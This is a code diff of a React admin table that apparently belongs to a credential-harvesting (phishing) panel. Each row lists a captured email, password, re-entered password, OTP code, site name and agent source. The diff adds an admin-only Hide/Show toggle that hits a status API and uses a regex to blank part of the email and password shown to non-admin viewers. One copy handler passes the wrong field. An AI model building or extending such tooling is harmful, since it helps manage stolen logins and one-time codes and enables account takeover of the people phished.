@@ -3,12 +3,32 @@ import { formatUtcToLocal } from "../../utils/DateFormater";
 import { handleCopyClick } from "../../utils/copyToClipboard";
 import Loader from "../../common/Loader";
 import useInformation from "../../hooks/useInformation";
+import { getData } from "../../api/fetching";
+import { useState } from "react";
+
 
 
 
 const InformationTable = () => {
-  const {loading,setIsRefresh, displayInfo,role} = useInformation()
- 
+  const [dataStatus,setDataStatus] = useState(false)
+
+  const { loading, setIsRefresh, displayInfo, role } = useInformation()
+
+  const handleDisabled = async (id: any,status:any) => {
+    try {
+      let orstatus;
+      if(!status){
+        orstatus = true
+      }else{
+        orstatus = false
+      }
+      await getData(`/information/${id}/status?status=${orstatus}`)
+      setIsRefresh(Math.random())
+    } catch (error: any) {
+      throw new Error(error)
+    }
+  }
+
 
   return (
     <div className="rounded-sm  -stroke bg-white px-5 pt-6 pb-2.5 shadow-default dark:-strokedark dark:bg-boxdark sm:px-7.5 xl:pb-1 ">
@@ -61,6 +81,15 @@ const InformationTable = () => {
               <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
                 OTP Code
               </th>
+              {
+                role === 'admin' && (
+                  <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
+
+                    Action
+                  </th>
+                )
+              }
+
               <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
                 Agent
               </th>
@@ -76,7 +105,7 @@ const InformationTable = () => {
 
           <tbody className='text-center'>
             {
-              displayInfo?.map(({ user, updatedAt,agent:{ip,source}, email, password, repassword, otp, siteName, _id }, index) => (
+              displayInfo?.map(({ user, updatedAt, agent: { source }, status, email, password, repassword, otp, siteName, _id }, index) => (
                 <tr key={_id} className=" ">
                   <th scope="row" className="px-2 py-1 font-bold cursor-pointer text-gray-900 whitespace-nowrap dark:text-white ">
                     {index + 1}
@@ -94,18 +123,18 @@ const InformationTable = () => {
                       }`}>{siteName}</span>
 
                   </td>
-                  <td onClick={() => handleCopyClick(email)} className="px-2 py-1 font-bold cursor-pointer">
+                  <td onClick={() => handleCopyClick(status ? (email as string).replace(/^(.{2})(.{3})/, '$1') : email)} className="px-2 py-1 font-bold cursor-pointer">
 
-                    <input type="text" className="p-2 dark:bg-graydark bg-bodydark1 " value={email} />
+                    <input type="text" className="p-2 dark:bg-graydark bg-bodydark1 " value={status ? (email as string).replace(/^(.{2})(.{3})/, '$1') : email} />
                   </td>
-                  <td onClick={() => handleCopyClick(password)} className="px-2 py-1 font-bold cursor-pointer ">
+                  <td onClick={() => handleCopyClick(status ? (password as string).replace(/^(.{2})(.{3})/, '$1') : password)} className="px-2 py-1 font-bold cursor-pointer ">
 
-                    <input type="text" className="p-2 dark:bg-graydark  bg-bodydark1" value={password} />
+                    <input type="text" className="p-2 dark:bg-graydark  bg-bodydark1" value={status ? (password as string).replace(/^(.{2})(.{3})/, '$1') : password} />
 
                   </td>
-                  <td onClick={() => handleCopyClick(repassword)} className="px-2 py-1 font-bold cursor-pointer ">
+                  <td onClick={() => handleCopyClick(status ? (password as string).replace(/^(.{2})(.{3})/, '$1') : password)} className="px-2 py-1 font-bold cursor-pointer ">
 
-                    <input type="text" className="p-2 dark:bg-graydark  bg-bodydark1" value={repassword} />
+                    <input type="text" className="p-2 dark:bg-graydark  bg-bodydark1" value={status ? (repassword as string)?.replace(/^(.{2})(.{3})/, '$1') : repassword} />
 
                   </td>
                   <td onClick={() => handleCopyClick(otp)} className="px-2 py-1 font-bold cursor-pointer ">
@@ -113,6 +142,18 @@ const InformationTable = () => {
 
 
                   </td>
+                  {
+                    role === 'admin' && (
+                      <td className="px-2 py-1 font-bold cursor-pointer ">
+                        <div className="relative inline-block">
+                          <button
+                            onClick={() => {handleDisabled(_id,status)}}
+                            className={`p-2 ${index % 2 === 0 ? 'bg-primary' : 'bg-[#2CB13C]'
+                              }`}>{!status ? 'Hide' : 'show'}</button>
+                        </div>
+                      </td>
+                    )
+                  }
 
 
                   <td className="px-2 py-1 font-bold cursor-pointer ">
